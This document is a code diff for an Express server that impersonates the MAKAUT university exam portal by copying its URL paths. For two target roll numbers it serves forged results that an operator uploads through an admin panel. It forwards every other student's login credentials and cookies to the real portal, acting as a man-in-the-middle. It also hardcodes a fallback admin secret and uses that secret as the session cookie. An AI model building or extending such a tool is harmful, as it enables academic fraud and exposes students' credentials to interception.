@@ -30,23 +30,50 @@ const overrideSchema = new mongoose.Schema({
 const OverrideStudent = mongoose.model('OverrideStudent', overrideSchema);
 const ADMIN_SECRET = process.env.ADMIN_SECRET || 'makaut_admin_secret_2026';
 
+// Middleware to protect Admin Routes
+const requireAdmin = (req, res, next) => {
+    if (req.cookies.admin_session === ADMIN_SECRET) {
+        next();
+    } else {
+        res.redirect('/admin-portal');
+    }
+};
+
+// --- ROUTES ---
+
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Admin Panel UI Route
+// 1. Admin Login Page (Only asks for Secret Key)
 app.get('/admin-portal', (req, res) => {
-    res.render('admin', { error: null, success: null });
+    res.render('admin_login', { error: null });
 });
 
-// Admin API Save Route
-app.post('/api/admin/save-override', async (req, res) => {
-    const { secret, roll_no, password, student_name, results_json } = req.body;
-    
-    if (secret !== ADMIN_SECRET) {
-        return res.render('admin', { error: 'Unauthorized: Invalid Admin Secret Key', success: null });
+// 2. Admin Auth Processor
+app.post('/admin-auth', (req, res) => {
+    if (req.body.secret === ADMIN_SECRET) {
+        res.cookie('admin_session', ADMIN_SECRET, { httpOnly: true });
+        return res.redirect('/admin/dashboard');
     }
+    res.render('admin_login', { error: 'Invalid Secret Key!' });
+});
 
+// 3. Admin Dashboard (Shows the two target roll numbers)
+app.get('/admin/dashboard', requireAdmin, (req, res) => {
+    res.render('admin_dashboard', { success: req.query.success });
+});
+
+// 4. Admin Edit Page (For the specific roll number clicked)
+app.get('/admin/edit/:rollNo', requireAdmin, async (req, res) => {
+    const rollNo = req.params.rollNo;
+    const student = await OverrideStudent.findOne({ roll_no: rollNo });
+    res.render('admin_edit', { rollNo: rollNo, student: student });
+});
+
+// 5. Admin Save Override Data
+app.post('/api/admin/save-override', requireAdmin, async (req, res) => {
+    const { roll_no, password, student_name, results_json } = req.body;
     try {
         const parsedResults = JSON.parse(results_json);
         await OverrideStudent.findOneAndUpdate(
@@ -59,26 +86,28 @@ app.post('/api/admin/save-override', async (req, res) => {
             },
             { upsert: true, new: true }
         );
-        res.render('admin', { error: null, success: `Successfully updated custom record for Roll: ${roll_no}` });
+        res.redirect('/admin/dashboard?success=Result successfully uploaded for Roll No: ' + roll_no);
     } catch (err) {
-        res.render('admin', { error: `Failed to save: ${err.message}`, success: null });
+        res.send("Error saving data. Please ensure JSON format is correct. Error: " + err.message);
     }
 });
 
-// Corrected Student Login Interception Route matching official portal paths
+// --- STUDENT LOGIN ROUTING (Intercepts the 2 custom users, proxies everyone else) ---
 app.post('/smartexam/public/student-login', async (req, res) => {
     const rollNo = req.body.username || req.body.rollNo || req.body.txtUserName;
     const password = req.body.password || req.body.txtPassword;
 
     try {
+        // Check MongoDB for custom records
         const customStudent = await OverrideStudent.findOne({ roll_no: rollNo?.trim() });
 
         if (customStudent && customStudent.password === password?.trim()) {
+            // Serve Custom Data
             res.cookie('local_session', rollNo.trim(), { httpOnly: true });
             return res.redirect('/smartexam/public/student/dashboard');
         }
 
-        // Proxy request to official MAKAUT endpoint
+        // Forward everyone else to Official MAKAUT Portal
         const officialResponse = await axios.post('https://makaut1.ucanapply.com/smartexam/public/student-login', 
             new URLSearchParams(req.body), {
                 headers: { 
@@ -103,17 +132,7 @@ app.post('/smartexam/public/student-login', async (req, res) => {
 
     } catch (error) {
         console.error('Login routing error:', error.message);
-        // Fallback proxy attempt if form field names differ
-        try {
-            const fallbackResponse = await axios.post('https://makaut1.ucanapply.com/smartexam/public/student-login', 
-                new URLSearchParams(req.body), {
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-                }
-            );
-            return res.send(fallbackResponse.data);
-        } catch (err2) {
-            res.status(500).send("Error communicating with official verification server.");
-        }
+        res.status(500).send("Error communicating with official verification server.");
     }
 });
 
@@ -122,18 +141,13 @@ app.get('/smartexam/public/student/dashboard', async (req, res) => {
 
     if (localSessionRoll) {
         const student = await OverrideStudent.findOne({ roll_no: localSessionRoll });
-        if (student) {
-            return res.render('custom_dashboard', { student });
-        }
+        if (student) return res.render('custom_dashboard', { student });
     }
 
     try {
         const cookieHeader = req.headers.cookie || '';
         const officialResponse = await axios.get('https://makaut1.ucanapply.com/smartexam/public/student/dashboard', {
-            headers: { 
-                'Cookie': cookieHeader,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-            }
+            headers: { 'Cookie': cookieHeader, 'User-Agent': 'Mozilla/5.0' }
         });
         return res.send(officialResponse.data);
     } catch (err) {
@@ -146,18 +160,13 @@ app.get('/smartexam/public/student/student-activity', async (req, res) => {
 
     if (localSessionRoll) {
         const student = await OverrideStudent.findOne({ roll_no: localSessionRoll });
-        if (student) {
-            return res.render('custom_results', { student });
-        }
+        if (student) return res.render('custom_results', { student });
     }
 
     try {
         const cookieHeader = req.headers.cookie || '';
         const officialResponse = await axios.get('https://makaut1.ucanapply.com/smartexam/public/student/student-activity', {
-            headers: { 
-                'Cookie': cookieHeader,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-            }
+            headers: { 'Cookie': cookieHeader, 'User-Agent': 'Mozilla/5.0' }
         });
         return res.send(officialResponse.data);
     } catch (err) {
